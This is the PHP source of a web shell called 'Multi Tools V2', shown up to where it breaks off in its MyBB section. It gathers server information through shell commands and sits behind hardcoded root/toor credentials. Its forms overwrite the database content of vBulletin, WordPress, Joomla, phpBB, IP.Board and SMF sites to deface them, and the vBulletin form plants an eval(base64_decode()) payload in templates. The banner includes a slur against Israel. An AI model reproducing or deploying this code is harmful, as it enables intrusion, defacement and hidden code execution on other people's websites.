<?php
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O    .. Multi Tools [ V2 ]  ....  sy34[at]msn[dot]com
#  `+---------------------------^----------|
#    `\_,-------, __EH << SyRiAn | 34G13__|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /
#  / XXXXXX /
# (________(
#  `------

$uselogin = 1;    // Make It 0 If you Want To Disable Auth
$user = 'root';  // Username
$pass = 'toor';   // Password
?>
<?
//////////////////////
//  Functions :p   ///
//////////////////////
function footer()
{
echo "	</form></center></center></p></font></td></tr></tbody></table><table bgcolor=#cccccc width=100%><tbody><tr><td align=right width=100>
<p dir=ltr><b><font color=gray  size=-2><p align=left><center><b><font color=gray>C0D3D By</font><font color=#990000>&nbsp; ~~ [ </font>
<font color=gray>EH SyRiAn_34G13</font><font color=#990000> ] ~~ [ </font><font color=gray>sy34@msn.com</font><font color=#990000> ]
</font></b></center></font></td></tr></tbody></table>";
}
function update()
{
echo "<table bgcolor=\"#cccccc\" width=\"100%\"><tbody><tr><td align=right width=\"100\"><center><font color=red size=1><b>Update Has D0n3 ^_^</b></font></center></td></tr></tbody></table>";
}

echo "
<html dir=rtl>
<head>

<title>Multi Tools V2</title>
<meta http-equiv=Content-Type content=text/html; charset=windows-1256>
<style>
BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #cccccc 1px solid;
BORDER-TOP:    #cccccc 1px solid;
BORDER-LEFT:   #cccccc 1px solid;
BORDER-BOTTOM: #cccccc 1px solid;
color: #ffffff;
}
td {
BORDER-RIGHT:  #cccccc 1px solid;
BORDER-TOP:    #cccccc 1px solid;
BORDER-LEFT:   #cccccc 1px solid;
BORDER-BOTTOM: #cccccc 1px solid;
color: #cccccc;
}
.table1 {
BORDER: 1px none;
BACKGROUND-COLOR: #000000;
color: #333333
}
.td1 {
BORDER: 1px none;
color: #ffffff; font-style:normal; font-variant:normal; font-weight:normal; font-size:7pt; font-family:tahoma
}
.tr1 {
BORDER: 1px none;
color: #cccccc
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #cccccc;
}
input {
BORDER-RIGHT:  #990000 1px solid;
BORDER-TOP:    #990000 1px solid;
BORDER-LEFT:   #990000 1px solid;
BORDER-BOTTOM: #990000 1px solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #CCCCCC;;
}
submit {
BORDER:  1px outset buttonhighlight;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #cccccc
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #cccccc;
background-color: #000000;
}
A:link {COLOR:#cccccc; TEXT-DECORATION: none}
A:visited { COLOR:#990000; TEXT-DECORATION: none}
A:active {COLOR:#990000; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</style>
</head>";
#######################
##  Aurhentication  ###
#######################
if ($uselogin ==1){
if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass)){
if($_POST[usrname]==$user and $_POST[passwrd]==$pass){
	print'<script>document.cookie="user='.$_POST[usrname].';";document.cookie="pass='.md5($_POST[passwrd]).';";</script>';
}else{
	if($_POST[usrname]){print'<script>alert("Go and play in the street man ")</script>';}
echo '
<body bgcolor=black>
<center><font color=#990000 ><b><h1>Multi Tools V2<h1></b></font>
<img src="http://www.m5zn.com/uploads/2010/2/25/photo/0ykjtetfc.jpg">
</center>
<div align="center">
<form name="fr" action="" method="POST" onsubmit="if(this.usrname.value==\'\'){return false;}"><font color="#990000" size="1"><b>UserName : </b></font><br>

<input name="usrname" type="text"  size="30" onfocus="if (this.value == \'UserName\'){this.value = \'\';}"/><br><font color="#990000" size="1"><b>Password : </b></font><br> <input name="passwrd" type="password" size="30" onfocus="if (this.value == \'PassWord\') this.value = \'\';" /><br><font color="#990000" size="4">
<input type="submit" value="  Login  " />
</form></p>';
exit;
}
}
}
///////////////////////////////
// Safe Mode ( On || 0ff )  ///
///////////////////////////////
$safe_mode = ini_get("safe_mode");
if (!$safe_mode)
    {$safe_mode = '0FF';}
     else {$safe_mode = '0N';}
//////////////////////////////////////////////
//  operating System .( Linux Or Windows ). //
//////////////////////////////////////////////
$os = null;
 $dir = getcwd();
if(strlen($dir)>1 && $dir[1]==":")
$os = "Windows";
else $os = "Linux";
///////////////////
//  Server Dir  //
//////////////////
if(empty($dir))
{ $opsy = getenv('OS');
if(empty($opsy))
{ $opsy = php_uname(); }
 if(empty($opsy))
 { $opsy ="-"; $os = "Linux"; }
 else { if(eregi("^Windows",$opsy)) { $os = "Windows"; }
 else { $os = "Linux"; }}}
if($os == "Linux")
{$pwd = shell_exec("pwd");}
 elseif($os == "Windows")
 {$pwd = shell_exec("cd");}
  if(empty($pwd))
  {$pwd = getcwd();}
////////////////
//  Uname -a  //
////////////////
$uname=shell_exec("uname -a");
//////////////////////
//  Magic Quotes   //
//////////////////////
$mag=get_magic_quotes_gpc();
if (empty($mag))
$mag = "0FF";
else {$mag="0N";}
////////////////////////////
//  Disable Functions    //
///////////////////////////
$disfun = ini_get('disable_functions');
if (empty($disfun))
$disfun = "NONE";
///////////////////
//  MySQL Test  //
//////////////////
$mysql_try = function_exists('mysql_connect');
if($mysql_try)
$mysql = "0N";
else {$mysql = "0FF";}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
echo "
<body dir=\"ltr\">
<table bgcolor=#cccccc cellpadding=0
cellspacing=0 width=\"100%\"><tbody><tr><td bgcolor=#000000 width=160>
<p dir=ltr><fontsize=4>&nbsp;&nbsp;</font></p>
<div dir=ltr align=center><font size=4><b>
<img border=0 src=http://www.m5zn.com/uploads/2010/2/25/photo/0ykjtetfc.jpg width=101 height=93>&nbsp;</b></font><div
dir=ltr align=center><span style=height: 25px;>
<b>
<font size=4 color=#FF0000>SyRi</font><font size=4 color=#008000>An_34</font><font size=4 color=#999999>G13</font></b><span style=font-size: 20pt; color: #990000; font-family: Impact;><p></p></span></span></div></div></td><td
bgcolor=#000000>

<p dir=ltr><font  size=1>&nbsp; <b>[<a href=?id=0>Main</a>]</b></span>
<font size=1><b>[<a href=?id=17>CMD</a>]</b></span>
<font color=black></span></font><b>[</span><a href=?id=1>VBulletin Hack</a>]</b></span>
<b>[</span><a href=?id=4>WordPress Hack</a>]</b></span>

<b>[</span><a href=?id=6>Joomla Hack</a>]</b></span>
<b>[</span><a href=?id=7>PHPBB Hack</a>]</b></span>
<b>[</span><a href=?id=11>I.P.Board Hack</a>]</b></span>
<b>[</span><a href=?id=14>SMF Hack</a>]</b></span>
<b>[</span><a href=?id=15>MyBB Hack</a>]</b></span>

<b>[</span><a href=?id=8>Inbox Mailer</a>]</b></span>
<b>[</span><a href=?id=3>Upload File</a>]</b></span>
<b>[</span><a href=?id=9>Users</a>]</b></span>
<b>[</span><a href=?id=10>SQL Reader</a>]</b></span>
<b>[</span><a href=?id=12>No Security</a>]</b></span><br>

&nbsp;&nbsp;<b>[</span><a href=?id=13>Bypass</a>]</b></span>
<b>[</span><a href=?id=5>Encryption</a>]</b></span>
<b>[</span><a href=?id=16>chmod Force</a>]</b></span>
<b>[</span><a href=?id=18>About</a>]</b></span>
<br>

<font size=1><br>
&nbsp;   Safe Mode = <font color=#990000>".$safe_mode." </font><font size=1>
&nbsp;   System = <font color=#990000>".$os."</font><br>
&nbsp;   Dis_Functions = <font color=#990000>". $disfun." </font><br>
&nbsp;   MySQL = <font color=#990000>".$mysql_try." </font>

&nbsp;   Magic_Quotes = <font color=#990000>". $mag." </font><br>
<br>
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=right width=100>
<p dir=ltr><font color=#990000  size=-2>
<b>uname -a : &nbsp;
<br>pwd : </span>&nbsp;<br></b></font></td><td>
<p dir=ltr><font color=#cccccc size=-2><b>
<br>&nbsp;&nbsp;".$uname."
<br>&nbsp;&nbsp;".$dir."</b>
</font></td></tr></tbody></table><font size=3><center>

</center></font></table>
";
//////////////////////
//  [ Main Page ]  //
/////////////////////
if ($_GET['id']==0 & !$_GET['id']=='fm')
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br>
<pre><p align=left><font size=-1>
#  ,--^----------,--------,-----,-------^--,<br>
#  | |||||||||   `--------'     |          O    .. Multi Tools [ V2 ]  ....  sy34[at]msn[dot]com   .... FuCk IsRaEl <br>
#  `+---------------------------^----------|<br>
#    `\_,-------, __EH << SyRiAn | 34G13__| <br>

#      / XXXXXX /`|     /                <br>
#     / XXXXXX /  `\   /                <br>
#    / XXXXXX /\______(                 <br>
#   / XXXXXX /                          <br>
#  / XXXXXX /                           <br>
# (________(                            <br>
#  `------                             <br></font></p></pre>
<br><p align=left>
&nbsp;&nbsp;This Script Was Cod3d For Educational Purposes Only !!<br>

&nbsp;&nbsp;I'm Not Responsible For Bad Usage !!</p><br>

</font></td></tr></tbody></table>
<table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
}
////////////////////////////
//  [ VBulltein Hack ]   //
///////////////////////////
if ($_GET['id']==1 )
{echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100><p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=center>
<center><font color='#990000'><b>VBulltien Index Changer Can Change The Index And Paybass All Security Hackes .. <br>Contains Three Queries .. Inject ( ForumHome , Header , Spacer_Open )</b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>

<input type = \"text\" name=\"HOST\" style=\"font-weight: 700\" value=\"localhost\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"USER\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>

<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;
</b> <input type=text name=\"DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<textarea name=\"INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p></form></p></font></td></tr></tbody></table><table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
}
$host =$_POST['HOST'];
$user =$_POST['USER'];
$pass =$_POST['PASS'];
$db =$_POST['DB'];
$index=$_POST['INDEX'];
if (empty($_POST['HOST']))
$host = 'localhost';

if ($_POST['INDEX'])
{
$index=str_replace("\'","'",$index);
$full_index  = "{\${eval(base64_decode(\'";
$full_index .= base64_encode("echo \"$index\";");
$full_index .= "\'))}}{\${exit()}}</textarea>";

mysql_connect($host,$user,$pass) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($db) or die ("Database Name Is Wrong !!");
$ok1 = mysql_query("UPDATE template SET template ='.$full_index.' WHERE title ='forumhome'") or die("Can't Update Forumhome !!");
if (!$ok1)
{
$ok2 = mysql_query("UPDATE template SET template ='.$full_index.' WHERE title ='header'") or die("Can't Update header !!");
}
elseif (!$ok2)
{
$ok3 = mysql_query("UPDATE template SET template ='.$full_index.' WHERE title ='spacer_open'") or die("Can't Update spacer_open !!");
mysql_close();
}
	if ($ok1 | $ok2 | $ok3)
    {update(); }
    else {echo "Updating Has Failed !";}
}
//////////////////////////
//  [ WordPress Hack ]  //
/////////////////////////
if ($_GET['id']==4)
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">

<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=center>
<center><font color='#990000'><b>WordPress Index Changer Can Change The Index By Injecting three templates ( post_title , post_name , post_content )<br></b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"WP_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>

<input type = \"text\" name=\"WP_USER\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"WP_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;
</b> <input type=text name=\"WP_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>

<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;
</b> <input type=text name=\"PREFIX\" value=\"wp_\"style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<p align=\"center\"><font color=\"gray\"><b>Please Enter Normal Index Like ( Hacked By SyRiAn_34G13 !! ) <br>Or You Can Use Meta Tags :p  )
</b> <b> </b></font>
</p>
<textarea name=\"WP_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>

<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p>
</form>
  </p>
</font></td></tr></tbody></table>
<table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
 }
$wp_host =$_POST['WP_HOST'];
$wp_user =$_POST['WP_USER'];
$wp_pass =$_POST['WP_PASS'];
$wp_db   =$_POST['WP_DB'];
$wp_index=$_POST['WP_INDEX'];
$prefix  =$_POST['PREFIX'];
$table_name = $prefix."posts" ;

if (empty($_POST['WP_HOST']))
$wp_host = 'localhost';

if (empty($_POST['PREFIX']))
$prefix  = 'wp_';
if ($_POST['WP_INDEX'])
{
mysql_connect($wp_host,$wp_user,$wp_pass) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($wp_db) or die( "DATABASE NAME Is Wrong !!");
$wp_ok1 = mysql_query("UPDATE $table_name SET post_title ='.$wp_index.' WHERE ID < 100 ")  or die("Can't Update POST_TITLE !!");
if(!$wp_ok1)
$wp_ok2 = mysql_query("UPDATE $table_name SET post_content ='.$wp_index.' WHERE ID < 100 ") or die("Can't Update POST_CONTENT !!");
elseif(!$wp_ok2)
$wp_ok3 = mysql_query("UPDATE $table_name SET post_name ='.$wp_index.' WHERE ID < 100 ") or die( "Can't Update POST_NAME !!");
mysql_close();
if ($wp_ok1 | $wp_ok2 | $wp_ok3)
{update();}
else {echo "Updating Has Failed !";}
}
///////////////////
//  Joomla Hack  //
//////////////////
if ($_GET['id']==6)
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=center>

<center><font color='#990000'><b>Joomla Index Changer Can Change The Index By Injecting three templates ( jos_menu , jos_modules )<br></b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"JOS_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"JOS_USER\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>

<input type = \"password\" name=\"JOS_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;
</b> <input type=text name=\"JOS_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;
</b> <input type=text name=\"JOS_PREFIX\" value=\"jos_\"style=\"font-weight: 700\"><b> </b></font>
</p>

<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<p align=\"center\"><font color=\"gray\"><b>Please Enter Normal Index Like ( Hacked By SyRiAn_34G13 !! ) <br>Or You Can Use Meta Tags :p  )
</b> <b> </b></font>
</p>
<textarea name=\"JOS_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p>
</form>
  </p>

</font></td></tr></tbody></table>
";
footer();
 }
$JOS_HOST =$_POST['JOS_HOST'];
$JOS_USER =$_POST['JOS_USER'];
$JOS_PASS =$_POST['JOS_PASS'];
$JOS_DB   =$_POST['JOS_DB'];
$JOS_INDEX=$_POST['JOS_INDEX'];
$prefix  =$_POST['PREFIX'];
$table_name = $prefix."posts" ;
$JOS_PREFIX  =$_POST['JOS_PREFIX'];
$jos_table_name = $JOS_PREFIX."menu" ;
$jos_table_name2 = $JOS_PREFIX."modules" ;
if (empty($_POST['JOS_HOST']))
$JOS_HOST = 'localhost';

if (empty($_POST['JOS_PREFIX']))
$JOS_PREFIX  = 'jos_';
if ($_POST['JOS_INDEX'])
{
mysql_connect($JOS_HOST,$JOS_USER,$JOS_PASS) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($JOS_DB) or die( "DATABASE NAME Is Wrong !!");
$jos_ok1 = mysql_query("UPDATE $jos_table_name SET name ='.$JOS_INDEX.' WHERE ID < 100 ")  or die("Can't Update jos_Menu !!");
if(!$jos_ok1)
$jos_ok2 = mysql_query("UPDATE $jos_table_name2 SET title ='.$JOS_INDEX.' WHERE ID < 100 ") or die("Can't Update jos_modules !!");
mysql_close();
if ($jos_ok1 | $jos_ok2)
{update();}
else {echo "Updating Has Failed !";}
}
/////////////////////
// [ PHPBB Hack ] //
////////////////////
if ($_GET['id']==7)
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=center>
<center><font color='#990000'><b>PHPBB Index Changer Can Change The Index By Injecting three templates ( phpbb_forums , phpbb_posts )<br></b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"PHP_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>

</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"PHP_USER\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"PHP_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;

</b> <input type=text name=\"PHP_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;
</b> <input type=text name=\"PHP_PREFIX\" value=\"phpbb_\"style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<p align=\"center\"><font color=\"gray\"><b>Please Enter Normal Index Like ( Hacked By SyRiAn_34G13 !! ) <br>Or You Can Use Meta Tags :p  )
</b> <b> </b></font>

</p>
<textarea name=\"PHP_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p>
</form>
  </p>
</font></td></tr></tbody></table>
";
footer();
 }

$PHP_HOST =$_POST['PHP_HOST'];
$PHP_USER =$_POST['PHP_USER'];
$PHP_PASS =$_POST['PHP_PASS'];
$PHP_DB   =$_POST['PHP_DB'];
$PHP_INDEX=$_POST['PHP_INDEX'];
$PHP_PREFIX  =$_POST['PHP_PREFIX'];
$php_table_name = $PHP_PREFIX."forums" ;
$php_table_name2 = $PHP_PREFIX."posts" ;

if (empty($_POST['PHP_HOST']))
$PHP_HOST = 'localhost';

if (empty($_POST['PHP_PREFIX']))
$PHP_PREFIX  = 'phpbb_';
if ($_POST['PHP_INDEX'])
{
mysql_connect($PHP_HOST,$PHP_USER,$PHP_PASS) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($PHP_DB) or die( "DATABASE NAME Is Wrong !!");
$php_ok1 = mysql_query("UPDATE $php_table_name SET forum_name ='.$PHP_INDEX.' WHERE forum_id < 100 ")  or die("Can't Update POST_TITLE !!");
if(!$php_ok1)
$php_ok2 = mysql_query("UPDATE $php_table_name2 SET post_subject ='.$PHP_INDEX.' WHERE post_id < 1000 ") or die("Can't Update POST_CONTENT !!");
mysql_close();
if ($php_ok1 | $php_ok2)
{update();}
else {echo "Updating Has Failed !";}
}
//////////////////////
//  I.P.Board Hack  //
/////////////////////
if ($_GET['id']==11)
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>

<br><p align=center>
<center><font color='#990000'><b>I.P.Board Index Changer Can Change The Index By Injecting three templates ( IP_forums , IP_topics )<br></b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"IP_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"IP_USER\" style=\"font-weight: 700\"><b> </b></font>
</p>

<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"IP_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;
</b> <input type=text name=\"IP_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;

</b> <input type=text name=\"IP_PREFIX\" value=\"ibf_\"style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">

<textarea name=\"IP_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p>
</form>
  </p>
</font></td></tr></tbody></table>

";
footer();
 }
$IP_HOST =$_POST['IP_HOST'];
$IP_USER =$_POST['IP_USER'];
$IP_PASS =$_POST['IP_PASS'];
$IP_DB   =$_POST['IP_DB'];
$IP_INDEX=$_POST['IP_INDEX'];
$IP_PREFIX  =$_POST['IP_PREFIX'];
$ip_table_name = $IP_PREFIX."components" ;
$ip_table_name2 = $IP_PREFIX."forums" ;
$ip_table_name3 = $IP_PREFIX."posts" ;
if (empty($_POST['IP_HOST']))
$IP_HOST = 'localhost';

if ($_POST['IP_INDEX'])
{
mysql_connect($IP_HOST,$IP_USER,$IP_PASS) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($IP_DB) or die( "DATABASE NAME Is Wrong !!");
$IP_ok1 = mysql_query("UPDATE $ip_table_name SET com_title ='.$IP_INDEX.' WHERE com_id <10 ")  or die("Can't Update Templates !!");
$IP_ok2 = mysql_query("UPDATE $ip_table_name2 SET name ='.$IP_INDEX.' WHERE id <10 ")  or die("Can't Update Templates !!");
$IP_ok3 = mysql_query("UPDATE $ip_table_name3 SET post  ='.$IP_INDEX.' WHERE pid <10 ")  or die("Can't Update Templates !!");
mysql_close();
if ($IP_ok1 | $IP_ok2 )
{update();}
else {echo "Updating Has Failed !";}
}
//////////////////////////
//    [ SMF Hack ]     //
/////////////////////////
if ($_GET['id']==14)
{
	echo "
	<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=#990000  size=-2>
<br><p align=center>
<center><font color='#990000'><b>SMF Index Changer Can Change The Index By Injecting boards Templates<br></b></font></center>
<form method=\"POST\">
<p align=\"center\"><font color=\"gray\"><b>HOST :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"SMF_HOST\" value=\"localhost\" style=\"font-weight: 700\"><b> </b></font>

</p>
<p align=\"center\"><font color=\"gray\"><b> DB-USER :&nbsp;&nbsp;&nbsp; </b>
<input type = \"text\" name=\"SMF_USER\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-PASS :&nbsp;&nbsp;&nbsp;&nbsp; </b>
<input type = \"password\" name=\"SMF_PASS\" style=\"font-weight: 700\"><b>
</b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> DB-NAME   :&nbsp;

</b> <input type=text name=\"SMF_DB\" style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font color=\"gray\"><b> Table Prefix   :&nbsp;
</b> <input type=text name=\"SMF_PREFIX\" value=\"smf_\"style=\"font-weight: 700\"><b> </b></font>
</p>
<p align=\"center\"><font size=\"4\" color=gray>INDEX :</font></p>
<p align=\"center\"><font color=\"gray\">
<p align=\"center\"><font color=\"gray\"><b>Please Enter Normal Index Like ( Hacked By SyRiAn_34G13 !! ) <br>Or You Can Use Meta Tags :p  )
</b> <b> </b></font>

</p>
<textarea name=\"SMF_INDEX\" style=\"font-weight: 700\" rows=14 cols=64></textarea></font></p>
<p align=\"center\"><font color=\"gray\"></textarea><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></font></p>
<p align=\"center\"><font color=\"gray\"><b>&nbsp;</b><input type=\"submit\" value=\"Hack Now !!\" style=\"font-weight: 700\"><b>
</b></font></p>
</form>
  </p>
</font></td></tr></tbody></table>
<table bgcolor=\"#cccccc\" width=\"100%\">
";
footer();
 }
$smf_host =$_POST['SMF_HOST'];
$smf_user =$_POST['SMF_USER'];
$smf_pass =$_POST['SMF_PASS'];
$smf_db   =$_POST['SMF_DB'];
$SMF_INDEX=$_POST['SMF_INDEX'];
$SMF_PREFIX  =$_POST['SMF_PREFIX'];
$table_name = $SMF_PREFIX."boards" ;


if (empty($_POST['SMF_HOST']))
$smf_host = 'localhost';

if ($_POST['SMF_INDEX'])
{
mysql_connect($smf_host,$smf_user,$smf_pass) or die( "Unable TO Connect DATABASE ! Username Or Password Is Wrong !!");
mysql_select_db($smf_db) or die( "DATABASE NAME Is Wrong !!");
$smf_ok1 = mysql_query("UPDATE $table_name SET description ='.$SMF_INDEX.' WHERE ID_BOARD < 100 ")  or die("Can't Update POST_TITLE !!");
if(!$wp_ok1)
$smf_ok2 = mysql_query("UPDATE $table_name SET name ='.$SMF_INDEX.' WHERE ID_BOARD < 100 ") or die("Can't Update POST_CONTENT !!");
mysql_close();
if ($smf_ok1 | $smf_ok2 )
{update();}
else {echo "Updating Has Failed !";}
}
//////////////////////////
//    [ MyBB Hack ]     //
/////////////////////////
if ($_GET['id']==15)
{
echo "
